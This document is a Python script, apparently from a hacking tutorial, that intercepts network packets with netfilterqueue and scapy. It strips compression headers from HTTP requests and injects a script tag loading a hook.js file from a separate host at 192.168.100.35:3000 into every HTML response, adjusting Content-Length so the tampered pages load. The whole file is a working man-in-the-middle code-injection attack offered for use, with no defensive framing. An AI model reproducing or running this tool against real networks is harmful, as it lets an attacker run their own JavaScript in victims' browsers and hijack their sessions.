#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import re as regex

# Defining loader functionality
def loader(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    del packet[scapy.IP].len
    return packet

# Defining Spoofed Functionality
def spoofed_packet(packets):
    scapy_packet = scapy.IP(packets.get_payload()) # converting packet to scapy packet i.e. IP layer
    if scapy_packet.haslayer(scapy.Raw):
        scapy_loader = scapy_packet[scapy.Raw].load
        # Destination Port
        if scapy_packet[scapy.TCP].dport == 10000:
            print("[+] Request")
            scapy_loader = regex.sub("Accept-Encoding:.*?\\r\\n", "", scapy_loader)
            scapy_loader = scapy_loader.replace("HTTP/1.1", "HTTP/1.0")
            # Removing Accept-Encoding in the request using regex rules.
            # The old packet will be returned as a string
            # Thus it will decode the response into HTML code
        # Source Port
        elif scapy_packet[scapy.TCP].sport == 10000:
            print("[+] Response")
            code_injection = '<script src="http://192.168.100.35:3000/hook.js"></script>'
            # Injecting HTML/JavaScript Code in the response field aka the html code of the website
            scapy_loader = scapy_loader.replace("</body>", code_injection + "</body>")
            search_content_length = regex.search("(?:Content-Length:\s)(\d*)", scapy_loader)
            # Checking if the search content length contains text/html i.e. in the scapy_loader
            if search_content_length and "text/html" in scapy_loader:
                content_length = search_content_length.group(1) # To pick the 2nd group in the search_content_length
                new_content_length = int(content_length) + len(code_injection)
                # To replace the content_length with new content length and assigning to scapy_loader
                scapy_loader = scapy_loader.replace(content_length, str(new_content_length))
        # Refactoring
        # Checking if scapy_loader is not equal to the raw layer of the scapy packet then execute the code
        if scapy_loader != scapy_packet[scapy.Raw].load:
            new_packet = loader(scapy_packet, scapy_loader)
            packets.set_payload(str(new_packet))
    packets.accept()  # accept packets

queue = netfilterqueue.NetfilterQueue()  # Creating instance of netfilterqueue object
queue.bind(0, spoofed_packet)  # to bind with the connceted queue. The 0 represents the queue no & the process_packet is
# the call back function
queue.run() # to run the function
# Using regex rule: (?:...). The () means to group and (?:...) means to not capture
# Thus Content length is separated into two groups, the first group will not be captured
# and the second group will be captured i.e. the digits that is included in the content length
# On line 40 we need to put str to convert the new content length into a string